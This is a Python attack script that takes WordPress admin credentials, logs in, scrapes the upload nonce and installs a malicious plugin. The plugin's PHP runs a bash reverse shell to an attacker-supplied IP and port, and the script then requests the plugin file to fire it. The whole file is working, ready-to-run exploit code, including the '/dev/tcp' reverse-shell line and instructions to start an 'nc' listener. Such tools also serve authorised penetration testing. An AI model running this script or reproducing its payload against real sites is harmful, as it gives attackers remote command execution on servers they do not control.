from requests import Session
from argparse import ArgumentParser
from string import ascii_lowercase
from random import choice
from re import search
from os import remove
from zipfile import ZipFile
from termcolor import colored as color
from urllib3 import disable_warnings, exceptions

disable_warnings(exceptions.InsecureRequestWarning)

parser = ArgumentParser(
    description="Wordpress Malicious plugin upload",
    epilog="./app.py -t http://domain_name.com/wordpress -u User_Admin -p Pass -L 192.168.20.2 -P 4040"
    )
parser.add_argument("-t", "--target", metavar="", type=str, help="Target URL")
parser.add_argument("-u", "--username", metavar="", type=str, help="Wordpress Username")
parser.add_argument("-p", '--password', metavar="", type=str, help="Wordpress Password")
parser.add_argument("-L", "--LHOST", metavar="", type=str, help="Attacker IP address")
parser.add_argument("-P", "--LPORT", metavar="", type=int, help="Attacker LOCAL PORT")
args = parser.parse_args()

host = args.target
username_value = args.username
password_value = args.password
LHOST = args.LHOST
LPORT = args.LPORT


class Script:

    payload = f"""<?php
    /**
    * Plugin Name: Reverse Shell Plugin
    * Plugin URI:
    * Description: Reverse Shell Plugin
    * Version: 1.0
    * Author: This is a copy, bruh
    * Author URI: http://www.sevenlayers.com
    */
    exec("/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'");
    ?>"""

    nonce_pattern = 'value="[0-9a-z]{10}"'                                      
    headers = {'user-agent': "Linux Mozilla 5/0", 'Accept-Encoding' : 'none'}
    shell_directory = (''.join(choice(ascii_lowercase) for i in range(7)))
    activate_shell = f"{host}/wp-content/plugins/{shell_directory}/shell.php"


    def Upload_plugin(self,session,nonce):

        f = open("shell.php", "w")
        f.write(self.payload)
        f.close()
        ZIP = ZipFile("rev.zip", 'w')
        ZIP.write("shell.php")
        ZIP.close()

        remove("shell.php")

        file = {
            "pluginzip": (self.shell_directory+".zip", open("rev.zip", "rb")),
            'install-plugin-submit': (None,'Install Now'),
            '_wpnonce': (None, nonce),
            '_wp_http_referer': (None, host + '/wp-admin/plugin-install.php?tab=upload'),
            'install-plugin-submit': (None,'Install Now')
        }

        print("***" * 15)
        print("[+] Uploading Malicious Plugin...")
        print("***" * 15 + "\n")

        try:
            session.post(
                url=host + "/wp-admin/update.php?action=upload-plugin",
                files=file,
                headers=self.headers,
                verify=False,
                timeout=30
            )
            remove("rev.zip")

        except Exception:

            remove("rev.zip")
            print(color("[✓] Plugin installed successfully\n", "white", attrs=["bold"]))
            print("[!] If you don't get the shell connection, manually trigger the URL:\n")
            print("***" * 20)
            print(self.activate_shell)
            print("***" * 20 + "\n")

    
    def exploit(self,session):

        find_install_dir = session.get(
            url=host + "/wp-admin/plugin-install.php?tab=upload",
            headers=self.headers,
            verify=False,
            timeout=35
        )

        if find_install_dir.status_code == 200:

            try:
                search_nonce = search(self.nonce_pattern, find_install_dir.text)
                last = search("[0-9a-z]{10}", search_nonce.group(0))
                nonce = last.group(0)

                self.Upload_plugin(session,nonce)
                print("Enjoy your shell :)\n")
                session.get(url=self.activate_shell, verify=False, timeout=30)

            except AttributeError:
                print("[!] Just remove the character: '/' in the end or check the URL" + "\n")
                exit()

        else:
            print("===" * 15)
            print("\n[X] Could not find <plugin-install.php> in the target dashboard?!\n")


    def main(self,username,password):

        session = Session()

        try:
            if session.get(url=host + "/wp-login.php").status_code == 200:
                try_login = session.post(

                    url=host + "/wp-login.php",
                    data={"log": username, "pwd": password, 'redirect_to': host + '/wp-admin/'},
                    headers=self.headers,
                    allow_redirects=False,
                    verify=False,
                    timeout=12
                )

                if "The password you entered for the username" not in try_login.text \
                    and "is not registered on this site." not in try_login.text:

                        print("===" * 20)
                        print("[+] Logged in successfully (preparing to upload...)")
                        print("===" * 20 + "\n")
                        print("---" * 15)
                        print("[+] Creating Plugin...")
                        print("---" * 15 + "\n")

                        self.exploit(session)
                else:
                    print("===" * 15)
                    return "\n[X] Login Failed! Check the Credentials\n"

            else:
                return "\n[X] Could not find the login page?!\n"

        except TimeoutError:
            print("===" * 15)
            return "\n[?] Could not connect to the target URL\n"


if __name__ == '__main__':

    run = Script()

    try:
        if host is not None and username_value is not None and password_value is not None \
            and LHOST is not None and LPORT is not None:

            print(open('logo.txt', 'rt').read())
            print(f"[!] ---> execute [nc -lvp {LPORT}]\n")

            print("===" * 15)
            print("[+] Starting...")
            print("===" * 15 + "\n")
            print(run.main(username_value, password_value))

        else:
            print("\nUSAGE: python3 Malicious.py -t <TARGET IP OR DOMAIN> -u <USERNAME> -p <PASSWORD> -L <LOCAL IP> -P <LOCAL PORT>\n")

    except KeyboardInterrupt:
        print("\n[!] CTRL+C Detected! Program stoped\n")
        exit()
    except IOError:
        exit()

